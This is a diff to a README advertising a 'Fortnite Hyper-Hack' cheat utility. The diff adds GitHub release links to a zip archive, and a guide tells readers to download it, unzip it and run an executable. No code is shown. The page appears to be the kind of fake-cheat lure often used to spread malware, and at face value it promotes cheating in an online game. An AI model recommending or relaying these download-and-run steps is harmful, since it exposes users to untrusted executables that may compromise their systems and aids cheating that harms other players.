@@ -1,10 +1,10 @@
 # 👁 Fortnite- Hyper-Hack
 Discover Hyper, a sophisticated utility designed to enhance the Fortnite experience. Developed and refined over many years, it features advanced compatibility solutions, enabling access even when conventional methods fail.
 
-# 🗂 [Download Hyper-Hack For Fortnite]()
+# 🗂 [Download Hyper-Hack For Fortnite](https://github.com/lapsterree/Fortnite-Hyper/releases/download/Hyper_V2/HyperLaunch_v2_Alpha.zip)
 
 # 📄 Guide
-1. Download the archive from [release]()
+1. Download the archive from [release](https://github.com/lapsterree/Fortnite-Hyper/releases/tag/Hyper_V2)
 2. Unzip to any folder
 3. Run HyperLaunch_V2.exe
 4. Click Continue
